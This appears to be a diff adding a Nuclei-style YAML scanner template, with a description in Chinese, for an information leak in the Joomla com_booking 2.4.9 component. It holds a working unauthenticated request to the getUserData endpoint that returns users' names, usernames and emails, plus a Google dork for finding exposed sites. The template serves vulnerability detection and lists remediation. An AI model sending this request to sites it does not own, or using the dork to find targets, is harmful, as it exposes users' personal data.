@@ -1,0 +1,43 @@
+id: joomla-com-booking-2-4-9-info-leak
+
+info:
+  name: "Joomla! com_booking 组件 2.4.9 敏感信息泄露漏洞"
+  author: r3Y3r53
+  severity: high
+  description: |
+    Joomla! com_booking 组件 2.4.9 存在信息泄露漏洞，导致敏感或机密数据被非授权个体或系统意外暴露或访问。
+  reference:
+    - https://www.exploit-db.com/exploits/51595
+    - http://www.artio.net/downloads/joomla/book-it/book-it-2-free/download
+  metadata:
+    verified: true
+    max-request: 1
+    google-query: inurl:"index.php?option=com_booking"
+  tags: Joomla
+  remediation: >-
+    升级到已修复版本，在受影响端点实施身份认证和授权，移除响应及调试输出中的敏感数据，限制管理接口的暴露范围，并轮换可能已泄露的凭据或密钥。
+
+http:
+  - raw:
+      - |
+        GET /index.php?option=com_booking&controller=customer&task=getUserData&id=123 HTTP/1.1
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"name":'
+          - '"username":'
+          - '"email":'
+        condition: and
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a004730450220201101df01d1b5a291f4b5acf1391eb2b92e20ebd5770d3f542a9eb51d30f718022100b92ff63a1cad5633e2d2dbf81eaaa44cf30cedac05164515bbf31d2eceae04e5:922c64590222798bb761d5b6d8e72950
